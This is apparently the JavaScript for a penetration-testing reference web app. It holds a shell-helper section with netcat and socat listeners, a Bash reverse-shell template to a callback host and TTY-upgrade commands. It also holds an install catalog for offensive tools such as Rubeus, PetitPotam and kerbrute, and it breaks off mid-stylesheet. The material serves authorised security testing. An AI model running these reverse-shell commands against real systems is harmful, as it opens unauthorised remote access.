const modes = [
    { id: "dark", name: "Dark" },
    { id: "light", name: "Light" }
];

const placeholderDescriptions = {
    "<TARGET>": "Target host, IP, URL, or service endpoint you want to inspect.",
    "<DOMAIN>": "Root domain or zone you want to enumerate or validate.",
    "<HOSTS_FILE>": "Input file containing hosts or URLs, usually one per line.",
    "<FILE>": "File you want to read, inspect, search, or pass into the selected command.",
    "<PASSWORD>": "Password or secret used for the selected authenticated request or client.",
    "<TOKEN>": "API token, session token, or similar credential required by the selected workflow.",
    "<PRODUCT>": "Product or application name you want to correlate with public exploit or scanner results.",
    "<VERSION>": "Version string or release number you want to check against tooling or public references.",
    "<START_PATH>": "Directory where the search should begin, such as . for the current tree or /var/www for web files.",
    "<PATTERN>": "Name, glob, or text pattern you want the command to match.",
    "<USER>": "Username or account context used by the selected local or remote command.",
    "<NMAP_XML>": "Nmap XML output file to import into screenshot or triage tooling.",
    "<OUTPUT_DIR>": "Directory where the tool should write reports, screenshots, or generated artifacts.",
    "<REPO_DIR>": "Local repository directory where code, dumped source, or cloned history should be stored.",
    "<REQUEST_FILE>": "Saved raw request captured from Burp or another client.",
    "<CLASS_FILE>": "Java source file you want to compile or replace inside a rebuilt client.",
    "<JAR_FILE>": "Java archive you want to inspect, run, decompile, or use as a classpath.",
    "<APP_NAME>": "Application or package directory name used by the selected build or packaging step.",
    "<CGI_PATH>": "Exact CGI route you want the selected check to probe, such as /cgi-bin/status.cgi.",
    "<BASELINE_SIZE>": "Known baseline response size used to filter noise.",
    "<BASE_DN>": "LDAP base DN such as DC=corp,DC=local.",
    "<CIDR>": "CIDR network range to scan.",
    "<NAMESERVER>": "Specific DNS server you want to query.",
    "<ASREP_KEY>": "Kerberos AS-REP key material used by the selected command.",
    "<AES256_HEX>": "AES-256 Kerberos key in hexadecimal form.",
    "<LHOST>": "Local callback host or listener address used by the generated payload or shell.",
    "<LPORT>": "Local listener port used by the generated payload or shell.",
    "<GROUP>": "Repository group, namespace, or owning collection used by the selected Git workflow.",
    "<PROJECT>": "Project or repository path segment used by the selected Git workflow.",
    "<PID>": "Process ID used by the selected local command."
};

const shellHelperDefaults = {
    host: "10.10.14.10",
    port: "4444"
};

const shellHelperSections = [
    {
        title: "Catch a session",
        kicker: "Listener & callback",
        description: "Keep the first move short and readable so you can focus on the environment instead of wrestling the shell.",
        cards: [
            {
                title: "Netcat Listener",
                label: "Listener",
                description: "Readable listener to catch a callback quickly.",
                template: "rlwrap -cAr nc -lvnp {{PORT}}"
            },
            {
                title: "Socat Listener",
                label: "Listener",
                description: "Cleaner socket-to-terminal handling than a raw netcat listener.",
                template: "socat file:`tty`,raw,echo=0 tcp-listen:{{PORT}}"
            },
            {
                title: "Bash Reverse Shell",
                label: "Callback",
                description: "Simple Linux callback when Bash TCP redirection is available.",
                template: "bash -c 'bash -i >& /dev/tcp/{{HOST}}/{{PORT}} 0>&1'"
            }
        ]
    },
    {
        title: "Stabilize the shell",
        kicker: "TTY upgrades",
        description: "Once the session lands, these are the moves that make it usable for real work.",
        cards: [
            {
                title: "Python PTY Spawn",
                label: "Upgrade",
                description: "Spawn a more interactive shell when Python is available.",
                template: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
            },
            {
                title: "Script-Based Upgrade",
                label: "Upgrade",
                description: "Useful when script(1) is present and you want a cleaner interactive shell.",
                template: "script /dev/null -qc /bin/bash"
            },
            {
                title: "Set TERM",
                label: "TTY",
                description: "Restore a reasonable terminal type before using interactive tooling.",
                template: "export TERM=xterm"
            },
            {
                title: "Foreground Repair",
                label: "TTY",
                description: "Common follow-up after Ctrl+Z when you need raw terminal handling back.",
                template: "stty raw -echo; fg"
            },
            {
                title: "Reset Terminal",
                label: "TTY",
                description: "Redraw the terminal cleanly after a rough upgrade path.",
                template: "reset"
            },
            {
                title: "Match Terminal Size",
                label: "TTY",
                description: "Fix full-screen tools after you know the local rows and columns.",
                template: "stty rows 40 columns 120"
            }
        ]
    }
];

const shellHelperChecklist = [
    "Start the listener before you trigger anything that should call back.",
    "Confirm which shell, interpreter, and networking options actually exist on the target.",
    "Upgrade the shell early if you plan to run editors, pagers, or full-screen tools.",
    "Keep your callback host, port, and transport written down so reruns stay clean."
];

const kaliDefaultInstallSource = {
    label: "Kali metapackages",
    url: "https://www.kali.org/docs/general-use/metapackages/"
};

const pdtmInstallSource = {
    label: "ProjectDiscovery PDTM install",
    url: "https://docs.projectdiscovery.io/opensource/pdtm/install"
};

const pdtmUsageSource = {
    label: "ProjectDiscovery PDTM usage",
    url: "https://docs.projectdiscovery.io/opensource/pdtm/usage"
};

function buildInstallRecord({
    status = "Install on demand",
    baseline = "Not tracked against the Kali default baseline yet.",
    summary = "",
    methods = [],
    sources = []
} = {}) {
    return {
        status,
        baseline,
        summary,
        methods,
        sources: getUniqueValuesByKey([kaliDefaultInstallSource, ...sources], "url")
    };
}

function getUniqueValuesByKey(values = [], key) {
    const seen = new Set();
    const output = [];

    values.forEach(value => {
        const id = value?.[key];
        if (!id || seen.has(id)) {
            return;
        }

        seen.add(id);
        output.push(value);
    });

    return output;
}

function buildAptInstallRecord(toolName, packageName, {
    commandName = toolName.toLowerCase(),
    sourceUrl = `https://www.kali.org/tools/${packageName}/`,
    sourceLabel = `Kali Tools: ${packageName}`,
    defaultStatus = false,
    summary = "",
    notes = [],
    verifyCommand = `${commandName} -h`,
    extraMethods = []
} = {}) {
    return buildInstallRecord({
        status: defaultStatus ? "Kali default package" : "Non-default Kali package",
        baseline: defaultStatus
            ? "Kali currently includes this in the default desktop toolset; the apt command is still useful for minimal installs or repairs."
            : "Not part of the kali-linux-default baseline used here; install it when this workflow needs it.",
        summary: summary || `${toolName} is available from the Kali repositories as ${packageName}.`,
        methods: [
            {
                label: "Kali apt",
                description: `Install the Kali package named ${packageName}.`,
                commands: [
                    "sudo apt update",
                    `sudo apt install ${packageName}`,
                    verifyCommand
                ].filter(Boolean),
                notes,
                source_label: sourceLabel,
                source_url: sourceUrl
            },
            ...extraMethods
        ],
        sources: [{ label: sourceLabel, url: sourceUrl }]
    });
}

function buildProjectDiscoveryInstallRecord(toolName, packageName, pdtmName, {
    aptCommandName = pdtmName,
    pdtmCommandName = pdtmName,
    sourceUrl = `https://www.kali.org/tools/${packageName}/`,
    sourceLabel = `Kali Tools: ${packageName}`,
    notes = []
} = {}) {
    return buildAptInstallRecord(toolName, packageName, {
        commandName: aptCommandName,
        sourceUrl,
        sourceLabel,
        summary: `${toolName} is not in kali-linux-default. Kali packages it as ${packageName}; ProjectDiscovery PDTM is a good alternative when you want upstream-managed binaries.`,
        notes,
        verifyCommand: `${aptCommandName} -h`,
        extraMethods: [
            {
                label: "ProjectDiscovery PDTM",
                description: "Use ProjectDiscovery's tool manager to install or update the upstream binary.",
                commands: [
                    "go install -v github.com/projectdiscovery/pdtm/cmd/pdtm@latest",
                    `pdtm -install ${pdtmName}`,
                    `${pdtmCommandName} -h`
                ],
                notes: [
                    "PDTM installs binaries under $HOME/.pdtm/go/bin by default and can add that path for you.",
                    "Use one installation path consistently so Kali package names and upstream binary names do not collide."
                ],
                source_label: "ProjectDiscovery PDTM",
                source_url: pdtmUsageSource.url
            }
        ]
    });
}

function buildGoInstallRecord(toolName, modulePath, {
    binaryName = toolName.toLowerCase(),
    summary = "",
    sourceLabel = toolName,
    sourceUrl = "",
    notes = []
} = {}) {
    return buildInstallRecord({
        status: "Non-default upstream Go install",
        baseline: "Not part of kali-linux-default; install from upstream when you need it.",
        summary: summary || `${toolName} is usually installed from upstream with Go.`,
        methods: [
            {
                label: "Go install",
                description: "Build and place the binary in your Go bin directory.",
                commands: [
                    "sudo apt update",
                    "sudo apt install golang-go",
                    `go install ${modulePath}@latest`,
                    "export PATH=\"$PATH:$(go env GOPATH)/bin\"",
                    `${binaryName} -h`
                ],
                notes: [
                    "Persist the PATH line in your shell profile if the command is not found after install.",
                    ...notes
                ],
                source_label: sourceLabel,
                source_url: sourceUrl
            }
        ],
        sources: sourceUrl ? [{ label: sourceLabel, url: sourceUrl }] : []
    });
}

function buildPipxInstallRecord(toolName, packageSpec, {
    binaryName = toolName.toLowerCase(),
    summary = "",
    sourceLabel = toolName,
    sourceUrl = "",
    notes = []
} = {}) {
    return buildInstallRecord({
        status: "Non-default Python install",
        baseline: "Not part of kali-linux-default; use an isolated Python install to avoid touching Kali's system Python.",
        summary: summary || `${toolName} is best installed in an isolated pipx environment on Kali.`,
        methods: [
            {
                label: "pipx",
                description: "Install into its own Python environment.",
                commands: [
                    "sudo apt update",
                    "sudo apt install pipx",
                    "pipx ensurepath",
                    `pipx install ${packageSpec}`,
                    `${binaryName} -h`
                ],
                notes,
                source_label: sourceLabel,
                source_url: sourceUrl
            }
        ],
        sources: sourceUrl ? [{ label: sourceLabel, url: sourceUrl }] : []
    });
}

function buildBurpExtensionInstallRecord(toolName, {
    bappUrl,
    summary = "",
    notes = []
} = {}) {
    return buildInstallRecord({
        status: "Burp extension",
        baseline: "Not a Kali system package; install it inside Burp Suite when you need that workflow.",
        summary: summary || `${toolName} is installed from Burp Suite's BApp Store.`,
        methods: [
            {
                label: "Burp BApp Store",
                description: "Install from inside Burp Suite Professional or Community when the extension supports your edition.",
                commands: [
                    "Burp Suite -> Extensions -> BApp Store",
                    `Search for '${toolName}'`,
                    "Install the extension and verify it appears under Extensions -> Installed"
                ],
                notes,
                source_label: `PortSwigger BApp: ${toolName}`,
                source_url: bappUrl
            }
        ],
        sources: bappUrl ? [{ label: `PortSwigger BApp: ${toolName}`, url: bappUrl }] : []
    });
}

const toolInstallationCatalog = new Map([
    ["accesschk", buildInstallRecord({
        status: "Windows helper",
        baseline: "Not a Kali tool; stage the Sysinternals binary on Windows hosts only when scope allows it.",
        summary: "AccessChk is distributed by Microsoft Sysinternals as a Windows executable.",
        methods: [
            {
                label: "PowerShell download",
                description: "Download and extract AccessChk on a Windows system.",
                commands: [
                    "Invoke-WebRequest https://download.sysinternals.com/files/AccessChk.zip -OutFile AccessChk.zip",
                    "Expand-Archive .\\AccessChk.zip .\\AccessChk",
                    ".\\AccessChk\\accesschk.exe /accepteula -h"
                ],
                notes: [
                    "Keep the download source and hash in your evidence notes if this binary is staged during an assessment."
                ],
                source_label: "Microsoft Sysinternals AccessChk",
                source_url: "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
            }
        ],
        sources: [{ label: "Microsoft Sysinternals AccessChk", url: "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk" }]
    })],
    ["Aquatone", buildInstallRecord({
        status: "Non-default archived binary",
        baseline: "Not packaged in Kali. The upstream repository is archived, so prefer modern screenshot tooling unless Aquatone is specifically needed.",
        summary: "Aquatone is installed from the archived upstream release and needs Chrome or Chromium available for screenshots.",
        methods: [
            {
                label: "Upstream release",
                description: "Install Chromium, download the latest archived Linux release, and place the binary on PATH.",
                commands: [
                    "sudo apt update",
                    "sudo apt install chromium unzip",
                    "tmpdir=$(mktemp -d)",
                    "curl -L -o \"$tmpdir/aquatone.zip\" https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip",
                    "unzip \"$tmpdir/aquatone.zip\" -d \"$tmpdir\"",
                    "sudo install \"$tmpdir/aquatone\" /usr/local/bin/aquatone",
                    "aquatone -version"
                ],
                notes: [
                    "The upstream README recommends Chromium over Google Chrome for headless reliability.",
                    "The GitHub repository is read-only, so expect this tool to age."
                ],
                source_label: "Aquatone README",
                source_url: "https://github.com/michenriksen/aquatone"
            }
        ],
        sources: [{ label: "Aquatone README", url: "https://github.com/michenriksen/aquatone" }]
    })],
    ["chisel", buildAptInstallRecord("chisel", "chisel", {
        sourceUrl: "https://www.kali.org/tools/chisel/",
        notes: ["Install the matching client/server binary on the side that needs to initiate the tunnel."]
    })],
    ["Clairvoyance", buildPipxInstallRecord("Clairvoyance", "clairvoyance", {
        binaryName: "clairvoyance",
        sourceLabel: "Clairvoyance",
        sourceUrl: "https://github.com/nikitastupin/clairvoyance",
        summary: "Clairvoyance is not in kali-linux-default; upstream documents pip and Docker installs."
    })],
    ["Coercer", buildAptInstallRecord("Coercer", "coercer", {
        sourceUrl: "https://www.kali.org/tools/coercer/"
    })],
    ["Dalfox", buildGoInstallRecord("Dalfox", "github.com/hahwul/dalfox/v2", {
        binaryName: "dalfox",
        sourceLabel: "Dalfox install guide",
        sourceUrl: "https://dalfox.hahwul.com/page/installation/"
    })],
    ["dirsearch", buildAptInstallRecord("dirsearch", "dirsearch", {
        sourceUrl: "https://www.kali.org/tools/dirsearch/"
    })],
    ["dnstool.py", buildAptInstallRecord("dnstool.py", "krbrelayx", {
        commandName: "dnstool.py",
        sourceUrl: "https://www.kali.org/tools/krbrelayx/",
        verifyCommand: "dnstool.py -h",
        notes: ["dnstool.py is installed by the krbrelayx Kali package."]
    })],
    ["dnsx", buildProjectDiscoveryInstallRecord("dnsx", "dnsx", "dnsx", {
        sourceUrl: "https://www.kali.org/tools/dnsx/"
    })],
    ["DOM Invader", buildInstallRecord({
        status: "Bundled Burp browser feature",
        baseline: "Not a Kali command-line package; use it from Burp Suite's embedded browser.",
        summary: "DOM Invader is available inside Burp Suite's browser-based testing workflow.",
        methods: [
            {
                label: "Burp Suite",
                description: "Enable and use DOM Invader from Burp's browser.",
                commands: [
                    "Burp Suite -> Proxy -> Intercept -> Open browser",
                    "Open the DOM Invader tab in the embedded browser devtools",
                    "Enable the checks needed for the target page"
                ],
                notes: ["Availability depends on the Burp Suite version and edition."],
                source_label: "PortSwigger DOM Invader",
                source_url: "https://portswigger.net/burp/documentation/desktop/tools/dom-invader"
            }
        ],
        sources: [{ label: "PortSwigger DOM Invader", url: "https://portswigger.net/burp/documentation/desktop/tools/dom-invader" }]
    })],
    ["Droopescan", buildPipxInstallRecord("Droopescan", "droopescan", {
        binaryName: "droopescan",
        sourceLabel: "Droopescan",
        sourceUrl: "https://github.com/SamJoan/droopescan"
    })],
    ["enum4linux-ng", buildAptInstallRecord("enum4linux-ng", "enum4linux-ng", {
        sourceUrl: "https://www.kali.org/tools/enum4linux-ng/"
    })],
    ["EyeWitness", buildAptInstallRecord("EyeWitness", "eyewitness", {
        commandName: "eyewitness",
        sourceUrl: "https://www.kali.org/tools/eyewitness/",
        defaultStatus: true,
        summary: "EyeWitness is available as a Kali package and is currently associated with Kali's default toolset, but the command is useful on minimal installs too.",
        notes: ["The upstream project also offers a virtualenv setup path, but the Kali package is the simplest path on Kali."]
    })],
    ["Feroxbuster", buildAptInstallRecord("Feroxbuster", "feroxbuster", {
        commandName: "feroxbuster",
        sourceUrl: "https://www.kali.org/tools/feroxbuster/"
    })],
    ["gf", buildGoInstallRecord("gf", "github.com/tomnomnom/gf", {
        binaryName: "gf",
        sourceLabel: "gf",
        sourceUrl: "https://github.com/tomnomnom/gf"
    })],
    ["GraphQLMap", buildInstallRecord({
        status: "Non-default Python install",
        baseline: "Not part of kali-linux-default; install from upstream in an isolated environment.",
        summary: "GraphQLMap is installed from the upstream repository.",
        methods: [
            {
                label: "venv from Git",
                description: "Clone the project and install it editable inside a virtual environment.",
                commands: [
                    "sudo apt update",
                    "sudo apt install git python3-venv",
                    "git clone https://github.com/swisskyrepo/GraphQLmap ~/tools/GraphQLmap",
                    "cd ~/tools/GraphQLmap",
                    "python3 -m venv .venv",
                    "source .venv/bin/activate",
                    "pip install --editable .",
                    "graphqlmap -h"
                ],
                notes: ["Keep the virtual environment active when running the tool unless you add a wrapper script."],
                source_label: "GraphQLMap",
                source_url: "https://github.com/swisskyrepo/GraphQLmap"
            }
        ],
        sources: [{ label: "GraphQLMap", url: "https://github.com/swisskyrepo/GraphQLmap" }]
    })],
    ["HTTP Request Smuggler", buildBurpExtensionInstallRecord("HTTP Request Smuggler", {
        bappUrl: "https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646"
    })],
    ["httpie", buildAptInstallRecord("httpie", "httpie", {
        sourceUrl: "https://www.kali.org/tools/httpie/"
    })],
    ["httpx", buildProjectDiscoveryInstallRecord("httpx", "httpx-toolkit", "httpx", {
        aptCommandName: "httpx-toolkit",
        pdtmCommandName: "httpx",
        sourceUrl: "https://www.kali.org/tools/httpx-toolkit/",
        notes: ["Kali names the binary httpx-toolkit to avoid a conflict with the Python httpx package."]
    })],
    ["InQL", buildBurpExtensionInstallRecord("InQL", {
        bappUrl: "https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f",
        summary: "InQL is usually installed as a Burp extension for GraphQL testing."
    })],
    ["interactsh-client", buildInstallRecord({
        status: "Non-default ProjectDiscovery install",
        baseline: "Not part of kali-linux-default; install from ProjectDiscovery when out-of-band interaction testing is in scope.",
        summary: "interactsh-client is an upstream ProjectDiscovery tool; PDTM or Go install keeps it current.",
        methods: [
            {
                label: "ProjectDiscovery PDTM",
                description: "Use ProjectDiscovery's tool manager to install the upstream binary.",
                commands: [
                    "go install -v github.com/projectdiscovery/pdtm/cmd/pdtm@latest",
                    "pdtm -install interactsh",
                    "interactsh-client -h"
                ],
                notes: ["PDTM installs binaries under $HOME/.pdtm/go/bin by default."],
                source_label: "ProjectDiscovery PDTM",
                source_url: pdtmUsageSource.url
            },
            {
                label: "Go install",
                description: "Build interactsh-client directly from upstream.",
                commands: [
                    "sudo apt update",
                    "sudo apt install golang-go",
                    "go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest",
                    "export PATH=\"$PATH:$(go env GOPATH)/bin\"",
                    "interactsh-client -h"
                ],
                notes: ["Persist the PATH line in your shell profile if the command is not found after install."],
                source_label: "ProjectDiscovery interactsh",
                source_url: "https://docs.projectdiscovery.io/tools/interactsh/usage"
            }
        ],
        sources: [pdtmInstallSource, pdtmUsageSource, { label: "ProjectDiscovery interactsh", url: "https://docs.projectdiscovery.io/tools/interactsh/usage" }]
    })],
    ["Joomscan", buildAptInstallRecord("Joomscan", "joomscan", {
        commandName: "joomscan",
        sourceUrl: "https://www.kali.org/tools/joomscan/"
    })],
    ["jq", buildAptInstallRecord("jq", "jq", {
        commandName: "jq",
        sourceUrl: "https://jqlang.org/download/",
        sourceLabel: "jq download",
        summary: "jq is not part of the kali-linux-default tool baseline used here, but it is available through apt."
    })],
    ["jwt-tool", buildInstallRecord({
        status: "Non-default Python install",
        baseline: "Not part of kali-linux-default; install from upstream in a dedicated directory.",
        summary: "jwt_tool is distributed from its upstream GitHub repository.",
        methods: [
            {
                label: "Git clone",
                description: "Clone jwt_tool and install its Python requirements in an isolated environment.",
                commands: [
                    "sudo apt update",
                    "sudo apt install git python3-venv",
                    "git clone https://github.com/ticarpi/jwt_tool ~/tools/jwt_tool",
                    "cd ~/tools/jwt_tool",
                    "python3 -m venv .venv",
                    "source .venv/bin/activate",
                    "pip install -r requirements.txt",
                    "python3 jwt_tool.py -h"
                ],
                notes: ["Create a shell alias if you want to call it as jwt-tool from anywhere."],
                source_label: "jwt_tool",
                source_url: "https://github.com/ticarpi/jwt_tool"
            }
        ],
        sources: [{ label: "jwt_tool", url: "https://github.com/ticarpi/jwt_tool" }]
    })],
    ["Katana", buildProjectDiscoveryInstallRecord("Katana", "katana", "katana", {
        sourceUrl: "https://www.kali.org/tools/katana/"
    })],
    ["kerbrute", buildGoInstallRecord("kerbrute", "github.com/ropnop/kerbrute", {
        binaryName: "kerbrute",
        sourceLabel: "kerbrute",
        sourceUrl: "https://github.com/ropnop/kerbrute"
    })],
    ["KrbRelayUp", buildInstallRecord({
        status: "Windows upstream binary",
        baseline: "Not a Kali package; build or download it for Windows-side AD CS and relay testing only when scope allows it.",
        summary: "KrbRelayUp is a Windows-focused GhostPack-style tool distributed from GitHub.",
        methods: [
            {
                label: "Release binary",
                description: "Download a release on your analysis box and stage only when appropriate.",
                commands: [
                    "Open https://github.com/Dec0ne/KrbRelayUp/releases",
                    "Download the release artifact you intend to use",
                    "Verify the file and stage it according to the engagement rules"
                ],
                notes: ["Prefer building from source when binary provenance matters."],
                source_label: "KrbRelayUp",
                source_url: "https://github.com/Dec0ne/KrbRelayUp"
            }
        ],
        sources: [{ label: "KrbRelayUp", url: "https://github.com/Dec0ne/KrbRelayUp" }]
    })],
    ["krbrelayx", buildAptInstallRecord("krbrelayx", "krbrelayx", {
        sourceUrl: "https://www.kali.org/tools/krbrelayx/"
    })],
    ["Naabu", buildProjectDiscoveryInstallRecord("Naabu", "naabu", "naabu", {
        sourceUrl: "https://www.kali.org/tools/naabu/"
    })],
    ["Nuclei", buildProjectDiscoveryInstallRecord("Nuclei", "nuclei", "nuclei", {
        sourceUrl: "https://www.kali.org/tools/nuclei/",
        notes: ["Run nuclei -update-templates after install if you need the latest community templates."]
    })],
    ["OWASP ZAP", buildAptInstallRecord("OWASP ZAP", "zaproxy", {
        commandName: "zaproxy",
        sourceUrl: "https://www.kali.org/tools/zaproxy/"
    })],
    ["Param Miner", buildBurpExtensionInstallRecord("Param Miner", {
        bappUrl: "https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943"
    })],
    ["PetitPotam", buildInstallRecord({
        status: "Non-default Python script",
        baseline: "Not part of kali-linux-default; clone upstream when this coercion check is in scope.",
        summary: "PetitPotam is a Python script that depends on Impacket.",
        methods: [
            {
                label: "Git clone",
                description: "Clone the script and ensure Impacket is available.",
                commands: [
                    "sudo apt update",
                    "sudo apt install git python3-impacket",
                    "git clone https://github.com/ly4k/PetitPotam ~/tools/PetitPotam",
                    "python3 ~/tools/PetitPotam/petitpotam.py -h"
                ],
                notes: ["The upstream README lists Impacket as the required dependency."],
                source_label: "PetitPotam",
                source_url: "https://github.com/ly4k/PetitPotam"
            }
        ],
        sources: [{ label: "PetitPotam", url: "https://github.com/ly4k/PetitPotam" }]
    })],
    ["PKINITtools", buildInstallRecord({
        status: "Non-default Python scripts",
        baseline: "Not part of kali-linux-default; install from upstream in a dedicated directory.",
        summary: "PKINITtools is distributed as Python scripts from upstream GitHub.",
        methods: [
            {
                label: "Git clone",
                description: "Clone the repository and install Python requirements in a virtual environment.",
                commands: [
                    "sudo apt update",
                    "sudo apt install git python3-venv",
                    "git clone https://github.com/dirkjanm/PKINITtools ~/tools/PKINITtools",
                    "cd ~/tools/PKINITtools",
                    "python3 -m venv .venv",
                    "source .venv/bin/activate",
                    "pip install -r requirements.txt",
                    "python3 gettgtpkinit.py -h"
                ],
                notes: ["Keep the virtual environment active while using the scripts."],
                source_label: "PKINITtools",
                source_url: "https://github.com/dirkjanm/PKINITtools"
            }
        ],
        sources: [{ label: "PKINITtools", url: "https://github.com/dirkjanm/PKINITtools" }]
    })],
    ["Pretender", buildInstallRecord({
        status: "Non-default upstream build",
        baseline: "Not part of kali-linux-default; build from upstream when this relay-support workflow is in scope.",
        summary: "Pretender can be built from source with Go.",
        methods: [
            {
                label: "Go build",
                description: "Clone the repository and build the binary.",
                commands: [
                    "sudo apt update",
                    "sudo apt install git golang-go",
                    "git clone https://github.com/RedTeamPentesting/pretender ~/tools/pretender",
                    "cd ~/tools/pretender",
                    "go build",
                    "sudo install pretender /usr/local/bin/pretender",
                    "pretender --help"
                ],
                notes: ["Pretender supports Linux and Windows builds through Go."],
                source_label: "Pretender",
                source_url: "https://github.com/RedTeamPentesting/pretender"
            }
        ],
        sources: [{ label: "Pretender", url: "https://github.com/RedTeamPentesting/pretender" }]
    })],
    ["qsreplace", buildGoInstallRecord("qsreplace", "github.com/tomnomnom/qsreplace", {
        binaryName: "qsreplace",
        sourceLabel: "qsreplace",
        sourceUrl: "https://github.com/tomnomnom/qsreplace"
    })],
    ["Rubeus", buildInstallRecord({
        status: "Windows upstream binary",
        baseline: "Not a Kali package; build or download it for Windows/Kerberos workflows only when scope allows it.",
        summary: "Rubeus is a Windows Kerberos tool from GhostPack.",
        methods: [
            {
                label: "Release or build",
                description: "Use a trusted release or build from source before staging.",
                commands: [
                    "Open https://github.com/GhostPack/Rubeus",
                    "Build from source with Visual Studio or obtain a trusted release artifact",
                    "Verify the file and stage it according to the engagement rules"
                ],
                notes: ["Record provenance and hashes for any binary you stage."],
                source_label: "Rubeus",
                source_url: "https://github.com/GhostPack/Rubeus"
            }
        ],
        sources: [{ label: "Rubeus", url: "https://github.com/GhostPack/Rubeus" }]
    })],
    ["SecLists", buildAptInstallRecord("SecLists", "seclists", {
        commandName: "ls /usr/share/seclists",
        sourceUrl: "https://www.kali.org/tools/seclists/",
        verifyCommand: "ls /usr/share/seclists"
    })],
    ["SSTImap", buildAptInstallRecord("SSTImap", "sstimap", {
        commandName: "sstimap",
        sourceUrl: "https://www.kali.org/tools/sstimap/"
    })],
    ["Subfinder", buildProjectDiscoveryInstallRecord("Subfinder", "subfinder", "subfinder", {
        sourceUrl: "https://www.kali.org/tools/subfinder/"
    })],
    ["Wappalyzer", buildInstallRecord({
        status: "Browser extension or upstream project",
        baseline: "Not a Kali command-line package; use the browser extension or an explicit CLI alternative.",
        summary: "Wappalyzer is typically used as a browser extension in this playbook.",
        methods: [
            {
                label: "Browser extension",
                description: "Install from your browser's extension store.",
                commands: [
                    "Open the Chrome Web Store or Firefox Add-ons",
                    "Search for Wappalyzer",
                    "Install the extension and pin it for quick target checks"
                ],
                notes: ["For CLI fingerprinting on Kali, WhatWeb and httpx -tech-detect are usually simpler."]
            }
        ],
        sources: [{ label: "Wappalyzer project", url: "https://www.wappalyzer.com/" }]
    })],
    ["waybackurls", buildGoInstallRecord("waybackurls", "github.com/tomnomnom/waybackurls", {
        binaryName: "waybackurls",
        sourceLabel: "waybackurls",
        sourceUrl: "https://github.com/tomnomnom/waybackurls"
    })],
    ["xfreerdp", buildAptInstallRecord("xfreerdp", "freerdp3-x11", {
        commandName: "xfreerdp",
        sourceUrl: "https://www.kali.org/tools/freerdp3/",
        verifyCommand: "xfreerdp /version"
    })]
]);

let toolManualLoadPromise = null;
let hasLoadedToolManualOverrides = false;

const savedModePreference = localStorage.getItem("io_mode");
let currentModeIndex = modes.findIndex(mode => mode.id === savedModePreference);

if (currentModeIndex === -1) {
    const legacyModeIndex = Number.parseInt(savedModePreference || "", 10);
    const legacyModes = ["light", "dark"];
    const legacyModeId = legacyModes[legacyModeIndex];

    if (legacyModeId) {
        currentModeIndex = modes.findIndex(mode => mode.id === legacyModeId);
    }
}

if (currentModeIndex === -1) {
    currentModeIndex = modes.findIndex(mode => mode.id === "dark");
}

const appContainer = document.getElementById("app-container");
const sidebar = document.getElementById("sidebar");
const sidebarToggleBtn = document.getElementById("sidebar-toggle-btn");
const categoryListDiv = document.getElementById("category-list");
const workspaceShell = document.getElementById("workspace-shell");
const payloadContainer = document.getElementById("payload-container");
const detailPanel = document.getElementById("tool-detail-panel");
const detailContainer = document.getElementById("detail-container");
const detailCaption = document.getElementById("tool-detail-caption");
const searchBox = document.getElementById("search-box");
const homeDashboard = document.getElementById("home-dashboard");
const resultsMeta = document.getElementById("results-meta");
const clearSearchBtn = document.getElementById("clear-search-btn");
const sidebarMetrics = document.getElementById("sidebar-metrics");
const popularToolsGrid = document.getElementById("popular-tools-grid");
const popularToolsMeta = document.getElementById("popular-tools-meta");
const shortcutGrid = document.getElementById("shortcut-grid");
const principlesList = document.getElementById("principles-list");
const heroTitle = document.getElementById("hero-title");
const heroSubtitle = document.getElementById("hero-subtitle");
const heroDisclaimer = document.getElementById("hero-disclaimer");
const themeBtn = document.getElementById("theme-btn");

const modal = document.getElementById("help-modal");
const modalTitle = document.getElementById("modal-title");
const modalBody = document.getElementById("modal-body");

let appMeta = {};
let db = [];
let navTree = {};
let currentViewDB = [];
let currentToolMatches = [];
let pathMetaByName = new Map();
let moduleMetaByName = new Map();
let toolProfileByName = new Map();
let toolManualOverrideByName = new Map();
let toolManualByName = new Map();
let activeView = {
    type: "home",
    path: null,
    module: null,
    tool: null,
    query: "",
    focusedId: null,
    broadSearch: false,
    fuzzySearch: false
};
let activeToolContext = {
    tool: null,
    path: null,
    module: null
};
let expandedSidebarPaths = new Set();
let expandedSidebarModules = new Set();
let isSidebarCollapsed = localStorage.getItem("io_sidebar_collapsed") === "1";
let hasInitializedSidebarState = false;
const defaultDetailCaption = "Open a tool and keep search results in view while the manual stays pinned here.";

function injectManualButtonStyles() {
    if (document.getElementById("manual-button-style")) {
        return;
    }

    const style = document.createElement("style");
    style.id = "manual-button-style";
    style.textContent = `
        .tool-actions .doc-pill,
        .tool-actions .install-pill,
        .manual-hero-actions .doc-pill {
            gap: 8px;
            min-height: 40px;
            padding: 0 15px;
            border-color: rgba(var(--accent-rgb), 0.3);
            background:
                linear-gradient(180deg, rgba(var(--accent-rgb), 0.18), rgba(var(--accent-rgb), 0.08)),
                var(--surface-muted);
            color: var(--accent-strong);
            font-size: 0.76rem;
            font-weight: 800;
            letter-spacing: 0.04em;
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.08),
                0 16px 32px -28px var(--shadow);
        }

        .tool-actions .install-pill,
        .manual-hero-actions .install-pill {
            gap: 8px;
            min-height: 40px;
            padding: 0 15px;
            border-color: rgba(var(--accent-rgb), 0.2);
            background: var(--surface-muted);
            color: var(--text-soft);
            font-size: 0.76rem;
            font-weight: 800;
            letter-spacing: 0.04em;
        }

        .tool-actions .doc-pill::after,
        .manual-hero-actions .doc-pill::after {
            content: "open_in_new";
            font-family: "Material Symbols Outlined";
            font-size: 1rem;
            font-weight: 400;
            letter-spacing: 0;
            line-height: 1;
        }

        .tool-actions .install-pill::after,
        .manual-hero-actions .install-pill::after {
            content: "download";
            font-family: "Material Symbols Outlined";
            font-size: 1rem;
            font-weight: 400;
            letter-spacing: 0;
            line-height: 1;
        }

        .manual-hero-actions .doc-pill {
            min-height: 46px;
            padding: 0 18px;
            font-size: 0.82rem;
        }

        .manual-hero-actions {
            flex-direction: column;
            align-items: flex-end;
        }

        .manual-hero-actions .install-pill {
            min-height: 42px;
            padding: 0 16px;
